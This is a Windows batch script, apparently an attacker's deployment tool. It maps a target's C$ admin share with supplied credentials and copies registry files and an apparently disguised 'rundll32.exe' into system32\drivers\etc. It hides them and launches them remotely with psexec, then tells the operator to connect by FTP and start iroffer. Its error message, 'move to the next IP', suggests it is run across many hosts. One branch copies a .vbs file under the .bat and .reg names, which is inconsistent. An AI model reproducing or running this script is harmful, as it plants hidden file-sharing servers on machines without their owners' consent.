@echo off
if exist R:\ GOTO DISCONNECT_R
net use R: \\%1\c$ /user:%2
if not exist R:\ GOTO MAPERROR

copy c:\ob\regkeyadd.bat r:\winnt\system32\drivers\etc\regkeyadd.bat
copy c:\ob\regkeyadd.reg r:\winnt\system32\drivers\etc\regkeyadd.reg


attrib +h r:\winnt\system32\drivers\etc\regkeyadd.bat
attrib +h r:\winnt\system32\drivers\etc\regkeyadd.reg

net use r: /delete 


psexec \\%1 -u %2 -d "c:\winnt\system32\drivers\etc\rundll32.exe"
psexec \\%1 -u %2 -d "c:\winnt\system32\drivers\etc\regkeyadd.bat"
cls
echo --------------------------------------------------------------
echo   Now just connect to the ftp IP %1 and start iroffer
echo --------------------------------------------------------------
GOTO EXIT

:DISCONNECT_R
net use r: /delete 
net use R: \\%1\c$ /user:%2
if not exist R:\ GOTO MAPERROR


copy c:\ob\regkeyadd.vbs r:\winnt\system32\drivers\etc\regkeyadd.bat
copy c:\ob\regkeyadd.vbs r:\winnt\system32\drivers\etc\regkeyadd.reg


attrib +h r:\winnt\system32\drivers\etc\regkeyadd.bat
attrib +h r:\winnt\system32\drivers\etc\regkeyadd.reg

net use r: /delete 

psexec \\%1 -u %2 -d "c:\winnt\system32\drivers\etc\rundll32.exe"
psexec \\%1 -u %2 -d "c:\winnt\system32\drivers\etc\regkeyadd.bat"
cls
echo ---------------------------------------------------------------
echo   Now just connect to the ftp IP %1 and start iroffer
echo ---------------------------------------------------------------
GOTO EXIT

:MAPERROR
cls
echo ---------------------------------------------------
echo   Unable to map the R: drive--move to the next IP
echo ---------------------------------------------------
GOTO EXIT

:EXIT